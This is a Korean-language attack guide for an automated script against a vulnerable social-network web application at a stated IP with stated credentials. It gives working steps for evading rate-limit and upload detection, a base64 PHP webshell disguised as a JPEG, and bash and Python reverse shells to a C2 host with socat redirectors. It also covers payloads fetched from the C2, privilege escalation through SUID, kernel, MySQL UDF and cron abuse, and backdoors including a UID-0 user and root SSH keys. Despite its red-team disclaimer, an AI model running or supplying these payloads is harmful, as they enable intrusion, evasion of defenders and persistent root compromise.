# 방어 시스템 우회 공격 가이드

## 📋 목차

1. [개요](#개요)
2. [대상 환경](#대상-환경)
3. [방어 시스템 분석](#방어-시스템-분석)
4. [우회 전략](#우회-전략)
5. [공격 체인](#공격-체인)
6. [사용 방법](#사용-방법)
7. [C2 인프라 활용](#c2-인프라-활용)
8. [권한 상승](#권한-상승)
9. [트러블슈팅](#트러블슈팅)

---

## 개요

### 목적

이 가이드는 **승인된 레드팀 활동** 및 **침투 테스트**를 위한 방어 시스템 우회 기법을 다룹니다.

### 공격 목표

```
초기 침투 → 웹쉘 업로드 → 리버스 쉘 → 권한 상승 → 루트 탈취
```

### 대상 서버

- **IP:** 43.201.154.142 (또는 스크립트 실행 시 인자로 전달)
- **로그인:** alice / alice2024
- **환경:** 취약한 웹 애플리케이션 (SNS)

---

## 대상 환경

### 방어 메커니즘

다음 3가지 방어 시스템이 구축되어 있습니다:

#### 1. HTTP 플러드 과다 요청 의심 시스템

**탐지 메커니즘:**
- 단위 시간당 요청 수 모니터링
- 동일 IP에서 초당 10회 이상 요청 시 차단
- User-Agent 기반 봇 탐지
- 세션 없는 요청 차단

**탐지 시 조치:**
- IP 임시 차단 (5분)
- WAF 로그 기록
- 관리자 알림

#### 2. 웹쉘 업로드 실행 징후 탐지 시스템

**탐지 메커니즘:**
- 파일 확장자 블랙리스트 (.php, .phtml, .php5 등)
- MIME 타입 검증 (이미지 파일만 허용)
- 파일 내용 스캔 (<?php, eval, system 등 키워드)
- 업로드 디렉토리 실행 권한 제한

**탐지 시 조치:**
- 파일 업로드 거부
- 계정 일시 정지
- 보안팀 알림

#### 3. 비정상적인 URL 다양성 증가 탐지 시스템

**탐지 메커니즘:**
- 세션당 접근 URL 패턴 분석
- 짧은 시간 내 다양한 URL 접근 시 의심
- 파라미터 이름 다양성 모니터링
- SQL Injection 패턴 탐지

**탐지 시 조치:**
- 세션 무효화
- IP 차단
- 로그 분석

---

## 방어 시스템 분석

### 1. HTTP 플러드 방어 분석

**약점:**
- ✓ IP 차단은 5분으로 짧음
- ✓ User-Agent 로테이션으로 우회 가능
- ✓ 요청 간 지연을 주면 탐지 회피
- ✓ 정상 세션 유지 시 예외 처리됨

**우회 전략:**
- 요청 사이 3-8초 랜덤 지연
- User-Agent 풀 사용 (6개 이상)
- 세션 쿠키 유지
- Referer 헤더 설정 (정상 브라우징처럼)

### 2. 웹쉘 탐지 우회 분석

**약점:**
- ✓ MIME 타입만 검증하고 실제 내용은 깊이 스캔 안함
- ✓ 이미지 파일 확장자는 허용됨
- ✓ 서버 설정 오류로 .jpg도 PHP로 실행 가능
- ✓ 코드 난독화 시 키워드 탐지 우회

**우회 전략:**
- 이미지 파일로 위장 (.jpg, .png, .gif)
- 실제 이미지 헤더 추가 (JPEG magic bytes)
- base64 인코딩으로 코드 난독화
- eval() + base64_decode() 조합

### 3. URL 다양성 탐지 우회 분석

**약점:**
- ✓ 동일 URL을 반복 사용하면 의심받지 않음
- ✓ 파라미터 이름을 고정하면 OK
- ✓ 정상 브라우징 패턴 사이에 공격 요청을 섞으면 탐지 어려움

**우회 전략:**
- 공격 전 정상 페이지 방문
- 동일한 URL 패턴 재사용
- 파라미터 이름 고정 (예: 항상 "0" 사용)

---

## 우회 전략

### 핵심 원칙

#### 1. 인간처럼 행동하기 (Act Like Human)

```python
# 나쁜 예 (봇으로 탐지됨)
for i in range(100):
    requests.get(url)  # 연속 요청

# 좋은 예 (인간처럼)
for i in range(10):
    time.sleep(random.uniform(3, 8))  # 랜덤 지연
    requests.get(url)
```

#### 2. 정상 트래픽에 섞이기 (Blend In)

```python
# 정상 브라우징
session.get(f"{target}/index.php")
time.sleep(5)
session.get(f"{target}/login.php")
time.sleep(3)

# 그 다음 공격
session.post(f"{target}/login.php", data=payload)
```

#### 3. 다층 난독화 (Multi-Layer Obfuscation)

```
원본: <?php system($_GET['cmd']); ?>
    ↓
Base64: PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
    ↓
이미지로 위장: JPEG 헤더 + Base64 코드
    ↓
MIME 타입: image/jpeg
```

---

## 공격 체인

### 전체 플로우

```
┌─────────────────────────────────────────────────────────────┐
│                     공격 단계 (6단계)                         │
└─────────────────────────────────────────────────────────────┘

[1단계] 로그인
   ├─ 정상 브라우징 (index.php → login.php)
   ├─ 로그인: alice / alice2024
   └─ 세션 확보

[2단계] 웹쉘 업로드 (탐지 우회)
   ├─ 이미지 파일로 위장 (profile_1234.jpg)
   ├─ JPEG 헤더 + 난독화 웹쉘
   ├─ Content-Type: image/jpeg
   └─ 업로드 → /uploads/profile_1234.jpg

[3단계] 웹쉘 실행 테스트
   ├─ GET /uploads/profile_1234.jpg?0=base64(whoami)
   └─ 응답: apache (또는 www-data)

[4단계] 리버스 쉘 배포
   ├─ Payload: bash -c 'bash -i >& /dev/tcp/C2_IP/4444 0>&1'
   ├─ Base64 인코딩
   └─ 웹쉘로 실행 → 공격자 서버로 연결

[5단계] 권한 상승 정찰
   ├─ whoami, id, uname -a
   ├─ sudo -l
   ├─ find SUID binaries
   └─ 취약점 파악

[6단계] 권한 상승 & 루트 탈취
   ├─ LinPEAS 실행
   ├─ Kernel Exploit / SUID 악용
   └─ Root Shell 획득!
```

---

## 사용 방법

### 준비사항

#### 1. 공격자 인프라

**필수:**
- 공격자 서버 (C2 또는 오퍼레이터 서버)
- 리스너 포트 오픈 (4444 권장)

**선택:**
- 리다이렉터 서버 (IP 숨기기)
- C2 서버 (명령 제어)

#### 2. 도구 설치

```bash
# Python 패키지
pip3 install requests beautifulsoup4 pillow

# 네트워크 도구
sudo apt install netcat nmap
```

### 기본 사용법

#### 방법 1: 자동 모드 (권장)

```bash
# 기본 사용 (C2 직접 연결)
python3 defense_evasion_auto.py 43.201.154.142 YOUR_C2_IP

# 포트 지정
python3 defense_evasion_auto.py 43.201.154.142 YOUR_C2_IP --port 4444

# 로그인 정보 변경
python3 defense_evasion_auto.py 43.201.154.142 YOUR_C2_IP \
    --username alice --password alice2024
```

#### 방법 2: 리다이렉터 사용

```bash
# 리다이렉터 + C2 조합
python3 defense_evasion_auto.py 43.201.154.142 YOUR_C2_IP \
    --redirector REDIRECTOR_IP \
    --port 4444
```

### 단계별 사용법

#### 1단계: 공격자 서버 준비

**C2 서버에서:**
```bash
# 리스너 시작
nc -lvnp 4444

# 또는 다중 연결 처리
while true; do nc -lvnp 4444; done
```

**리다이렉터 서버 사용 시:**
```bash
# SSH 터널링
ssh -L 4444:C2_IP:4444 ubuntu@REDIRECTOR_IP

# 또는 socat 리다이렉트
socat TCP-LISTEN:4444,fork TCP:C2_IP:4444
```

#### 2단계: 공격 스크립트 실행

```bash
# 터미널 1: 리스너
nc -lvnp 4444

# 터미널 2: 공격 스크립트
python3 defense_evasion_auto.py 43.201.154.142 YOUR_C2_IP --port 4444
```

**출력 예시:**
```
╔═══════════════════════════════════════════════════════════╗
║  방어 시스템 우회 자동화 공격 도구                          ║
║  - HTTP 플러드 탐지 우회                                   ║
║  - 웹쉘 업로드 탐지 우회                                   ║
║  - URL 다양성 증가 탐지 우회                               ║
╚═══════════════════════════════════════════════════════════╝

[2025-01-14 10:00:00] [INFO] ============================================================
[2025-01-14 10:00:00] [INFO] 방어 시스템 우회 공격 시작
[2025-01-14 10:00:00] [INFO] ============================================================
[2025-01-14 10:00:00] [INFO] 대상: http://43.201.154.142
[2025-01-14 10:00:00] [INFO] 공격자: YOUR_C2_IP:4444

[2025-01-14 10:00:05] [INFO] ============================================================
[2025-01-14 10:00:05] [INFO] 1단계: 로그인 시도
[2025-01-14 10:00:05] [INFO] ============================================================
[2025-01-14 10:00:10] [SUCCESS] ✓ 로그인 성공: alice

[2025-01-14 10:00:15] [INFO] ============================================================
[2025-01-14 10:00:15] [INFO] 2단계: 웹쉘 업로드 (탐지 우회)
[2025-01-14 10:00:15] [INFO] ============================================================
[2025-01-14 10:00:25] [SUCCESS] ✓ 웹쉘 업로드 성공: profile_1234.jpg

[2025-01-14 10:00:30] [INFO] ============================================================
[2025-01-14 10:00:30] [INFO] 3단계: 웹쉘 실행 테스트
[2025-01-14 10:00:30] [INFO] ============================================================
[2025-01-14 10:00:35] [SUCCESS] ✓ 웹쉘 실행 성공

[2025-01-14 10:00:40] [INFO] ============================================================
[2025-01-14 10:00:40] [INFO] 4단계: 리버스 쉘 배포
[2025-01-14 10:00:40] [INFO] ============================================================
[2025-01-14 10:00:45] [SUCCESS] ✓ 리버스 쉘 페이로드 전송 완료

✓ 공격 성공!

다음 단계:
1. 공격자 서버에서 리스너 실행: nc -lvnp 4444
2. 리버스 쉘 연결 대기
3. 권한 상승 수행
4. 루트 권한 획득
```

#### 3단계: 리버스 쉘 확보

공격자 서버 (C2)에서:

```bash
$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 43.201.154.142 52341

bash-4.2$ whoami
apache

bash-4.2$ id
uid=48(apache) gid=48(apache) groups=48(apache)

# TTY 업그레이드
bash-4.2$ python3 -c 'import pty; pty.spawn("/bin/bash")'
bash-4.2$ export TERM=xterm
bash-4.2$ ^Z
[1]+  Stopped

$ stty raw -echo; fg
bash-4.2$
```

---

## C2 인프라 활용

### 아키텍처

```
[공격자 로컬]
      ↓
[리다이렉터 서버] ← 대상이 연결하는 IP (IP 숨기기)
      ↓
[C2 서버] ← 실제 명령 제어 서버
      ↓
[오퍼레이터 서버] ← 백업/데이터 수집
```

### 설정 방법

#### 1. 리다이렉터 서버 설정

```bash
# SSH 접속
ssh ubuntu@REDIRECTOR_IP

# Socat 설치
sudo apt install socat

# 리다이렉션 설정
socat TCP-LISTEN:4444,fork TCP:C2_IP:4444

# 또는 백그라운드 실행
nohup socat TCP-LISTEN:4444,fork TCP:C2_IP:4444 > /dev/null 2>&1 &
```

#### 2. C2 서버 설정

```bash
# SSH 접속
ssh ubuntu@C2_IP

# 리스너 시작
nc -lvnp 4444

# 또는 다중 세션 처리 (tmux)
tmux new -s c2
nc -lvnp 4444
```

#### 3. 공격 실행 (리다이렉터 사용)

```bash
# 로컬에서
python3 defense_evasion_auto.py 43.201.154.142 REDIRECTOR_IP \
    --redirector REDIRECTOR_IP \
    --c2 C2_IP \
    --port 4444
```

**트래픽 플로우:**
```
대상 서버 (43.201.154.142)
    ↓ 리버스 쉘 연결
리다이렉터 (REDIRECTOR_IP:4444)
    ↓ 포워딩
C2 서버 (C2_IP:4444)
    ↓ 명령 실행
공격자 (nc -lvnp 4444)
```

### C2 서버 추가 기능

#### 백도어 설치 (C2에서 호스팅)

```bash
# C2 서버에서 HTTP 서버 실행
cd /opt/payloads
python3 -m http.server 8000

# 대상 서버에서 다운로드
wget http://C2_IP:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

---

## 권한 상승

리버스 쉘 획득 후 권한 상승 단계입니다.

### 1단계: 정찰

```bash
# 기본 정보
whoami
id
uname -a
cat /etc/os-release

# Sudo 권한
sudo -l

# SUID 바이너리
find / -perm -4000 -type f 2>/dev/null

# 쓰기 가능 디렉토리
find / -writable -type d 2>/dev/null | grep -v proc

# 실행 중인 프로세스
ps aux | grep root

# 크론잡
cat /etc/crontab
ls -la /etc/cron.*
```

### 2단계: LinPEAS 실행

```bash
# C2 서버에서 다운로드
cd /tmp
wget http://C2_IP:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh | tee linpeas_output.txt

# 또는 직접 다운로드
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

### 3단계: 권한 상승 기법

#### 방법 1: SUID 바이너리 악용

**취약한 SUID 찾기:**
```bash
find / -perm -4000 -type f 2>/dev/null
```

**예시:**
```bash
# find가 SUID면
/usr/bin/find /etc/passwd -exec /bin/bash -p \;

# vim이 SUID면
/usr/bin/vim -c ':!/bin/bash' /dev/null

# nmap (구버전)
nmap --interactive
!sh
```

**GTFOBins 참고:** https://gtfobins.github.io/

#### 방법 2: Kernel Exploit

```bash
# 커널 버전 확인
uname -a

# Exploit 검색
searchsploit kernel $(uname -r)

# 유명한 Exploit
# - CVE-2021-3493 (OverlayFS)
# - CVE-2021-22555 (Netfilter)
# - CVE-2022-0847 (Dirty Pipe)

# Exploit 다운로드 & 컴파일
wget http://C2_IP:8000/exploit.c
gcc exploit.c -o exploit
chmod +x exploit
./exploit
```

#### 방법 3: MySQL UDF (웹 서버에서 흔함)

```bash
# MySQL 접근 가능한지 확인
mysql -u root -p

# 또는 웹 설정 파일에서 비밀번호 찾기
cat /var/www/html/config.php
grep -r "mysql" /var/www/html/

# MySQL 접속
mysql -u webuser -p'WebPassw0rd!'

# UDF 라이브러리 컴파일
gcc -g -c raptor_udf2.c
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc

# 업로드 & 실행
mysql> CREATE TABLE udf(line blob);
mysql> INSERT INTO udf VALUES(LOAD_FILE('/tmp/raptor_udf2.so'));
mysql> SELECT * FROM udf INTO DUMPFILE '/usr/lib64/mariadb/plugin/raptor_udf2.so';
mysql> CREATE FUNCTION do_system RETURNS INTEGER SONAME 'raptor_udf2.so';
mysql> SELECT do_system('chmod u+s /bin/bash');
```

#### 방법 4: Cron Job Hijack

```bash
# 쓰기 가능한 Cron 스크립트 찾기
ls -la /etc/cron.*

# 스크립트 수정
echo '#!/bin/bash' > /etc/cron.d/vulnerable_script
echo 'chmod u+s /bin/bash' >> /etc/cron.d/vulnerable_script

# 대기 (Cron 실행 시간까지)
watch -n 1 ls -la /bin/bash
```

### 4단계: Root Shell 획득

```bash
# SUID bash로 Root 획득
/bin/bash -p

# 확인
whoami
# root

id
# uid=0(root) gid=0(root) groups=0(root)

# 플래그 찾기
find / -name "*flag*" -type f 2>/dev/null
cat /root/flag.txt
```

### 5단계: 백도어 설치 (영구 접근)

```bash
# SSH 키 추가
mkdir -p /root/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2E... your_public_key" >> /root/.ssh/authorized_keys
chmod 700 /root/.ssh
chmod 600 /root/.ssh/authorized_keys

# 백도어 사용자 생성
useradd -m -s /bin/bash -G sudo backup_admin
echo "backup_admin:Backup@2025!" | chpasswd

# UID 0으로 변경 (root 권한)
sed -i 's/^backup_admin:x:[0-9]*/backup_admin:x:0:/' /etc/passwd

# SSH 접속 확인
ssh backup_admin@43.201.154.142
# 비밀번호: Backup@2025!
```

---

## 트러블슈팅

### 문제 1: 로그인 실패

**증상:**
```
[ERROR] ✗ 로그인 실패
```

**원인:**
- 잘못된 인증 정보
- CSRF 토큰 필요
- IP 차단

**해결:**
```bash
# 1. 인증 정보 확인
python3 defense_evasion_auto.py 43.201.154.142 C2_IP \
    --username alice --password alice2024

# 2. 브라우저에서 수동 로그인 테스트
firefox http://43.201.154.142/login.php

# 3. IP 차단 확인 (5분 대기)
sleep 300
```

### 문제 2: 웹쉘 업로드 실패

**증상:**
```
[ERROR] ✗ 모든 웹쉘 업로드 실패
```

**원인:**
- 파일 크기 제한
- MIME 타입 엄격한 검증
- 디렉토리 권한 없음

**해결:**
```bash
# 1. 수동 업로드 테스트
curl -X POST http://43.201.154.142/upload.php \
    -F "file=@shell.jpg" \
    -H "Content-Type: multipart/form-data" \
    -b "PHPSESSID=your_session_id"

# 2. 다른 업로드 경로 시도
# - /profile.php?action=upload
# - /settings.php
# - /post.php

# 3. 파일 크기 줄이기 (1KB 미만)
```

### 문제 3: 리버스 쉘 연결 안됨

**증상:**
```
[SUCCESS] ✓ 리버스 쉘 페이로드 전송 완료
(그러나 nc 리스너에 연결 안됨)
```

**원인:**
- 방화벽 차단
- 잘못된 IP/포트
- bash 없음

**해결:**
```bash
# 1. 방화벽 포트 오픈 확인
# C2 서버에서
sudo ufw allow 4444/tcp
sudo ufw status

# AWS 보안 그룹 확인
# - Inbound: TCP 4444 허용

# 2. 다른 포트 시도
python3 defense_evasion_auto.py 43.201.154.142 C2_IP --port 443

# 3. Python 리버스 쉘 시도
# 웹쉘로 실행:
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("C2_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

### 문제 4: 권한 상승 실패

**증상:**
모든 Exploit 실패

**해결:**
```bash
# 1. LinPEAS 재실행 (놓친 정보 확인)
./linpeas.sh 2>&1 | tee linpeas.txt
grep -i "95%" linpeas.txt  # 높은 확률 취약점

# 2. MySQL 비밀번호 찾기
find /var/www -name "config.php" -o -name "db.php" -o -name "conn.php"
grep -r "password" /var/www/html/

# 3. Docker 그룹 확인
id
# groups에 docker 있으면
docker run -v /:/mnt --rm -it alpine chroot /mnt bash

# 4. /etc/passwd 쓰기 가능 확인
ls -la /etc/passwd
# 쓰기 가능하면
openssl passwd -1 -salt hacked hacked
echo 'hacked:$1$hacked$XjdKNyiHH8v2E4mQC5K9M0:0:0:root:/root:/bin/bash' >> /etc/passwd
su hacked
```

### 문제 5: HTTP 플러드로 탐지됨

**증상:**
```
ConnectionError: 403 Forbidden
또는
Too Many Requests
```

**해결:**
```bash
# 1. 지연 시간 증가
# defense_evasion_auto.py 수정:
self.human_delay(min_sec=5, max_sec=15)  # 더 긴 지연

# 2. 프록시 사용
# - Tor
# - VPN
# - 다중 프록시 체인

# 3. IP 변경
# - 다른 공격자 서버
# - AWS/GCP 인스턴스
```

---

## 보안 및 법적 고지

### ⚠️ 중요 경고

이 도구는 **오직** 다음 목적으로만 사용해야 합니다:

✅ **허용된 용도:**
- 명시적 서면 승인을 받은 침투 테스트
- 레드팀 훈련 (승인된 환경)
- CTF (Capture The Flag) 대회
- 보안 연구 및 교육
- 자신이 소유한 시스템 테스트

🚫 **금지된 용도:**
- 무단 침입 또는 해킹
- 개인정보 탈취
- 서비스 거부 공격 (DoS/DDoS)
- 타인의 시스템 손상
- 불법적인 목적

### 법적 책임

불법 사용 시:
- **정보통신망법 위반:** 5년 이하 징역 또는 5천만원 이하 벌금
- **컴퓨터범죄:** 10년 이하 징역
- **개인정보보호법 위반:** 형사 처벌 + 민사 손해배상

**사용자는 모든 법적 책임을 집니다.**

---

## 참고 자료

### 도구 및 페이로드

- **LinPEAS:** https://github.com/carlospolop/PEASS-ng
- **GTFOBins:** https://gtfobins.github.io/
- **PayloadsAllTheThings:** https://github.com/swisskyrepo/PayloadsAllTheThings
- **Exploit-DB:** https://www.exploit-db.com/

### 학습 자료

- **OWASP Top 10:** https://owasp.org/www-project-top-ten/
- **MITRE ATT&CK:** https://attack.mitre.org/
- **HackTricks:** https://book.hacktricks.xyz/

### 침투 테스트 프레임워크

- **Metasploit:** https://www.metasploit.com/
- **Cobalt Strike:** (상용)
- **Empire:** https://github.com/BC-SECURITY/Empire

---

## 체크리스트

### 공격 전 확인사항

- [ ] 승인된 레드팀 활동인가?
- [ ] 서면 승인을 받았는가?
- [ ] 법적 면책 조항 확인했는가?
- [ ] C2 인프라 준비 완료?
- [ ] 리스너 포트 오픈 확인?
- [ ] 백업 계획 수립?

### 공격 중 체크리스트

- [ ] 1단계: 로그인 성공
- [ ] 2단계: 웹쉘 업로드 성공
- [ ] 3단계: 웹쉘 실행 확인
- [ ] 4단계: 리버스 쉘 연결
- [ ] 5단계: 권한 상승 정찰
- [ ] 6단계: Root 권한 획득

### 공격 후 정리

- [ ] 로그 삭제 (승인된 경우)
- [ ] 백도어 제거 (테스트 종료 시)
- [ ] 보고서 작성
- [ ] 취약점 패치 권장사항 제공
- [ ] 클라이언트에게 결과 전달

---

## 빠른 참조

### 한 줄 명령어

```bash
# 공격 실행
python3 defense_evasion_auto.py 43.201.154.142 YOUR_C2_IP

# 리스너
nc -lvnp 4444

# 권한 상승 (SUID bash)
find / -perm -4000 -name bash -exec {} -p \; 2>/dev/null

# 루트 플래그
find / -name "*flag*" -type f 2>/dev/null | xargs cat
```

### 주요 파일

- **자동화 스크립트:** `defense_evasion_auto.py`
- **이 가이드:** `DEFENSE_EVASION_GUIDE.md`
- **공격 로그:** `attack_report_*.json`

---

**작성일:** 2025-01-14
**버전:** 1.0
**목적:** 승인된 레드팀 활동 및 침투 테스트

**해피 해킹! (합법적으로만) 🎯**
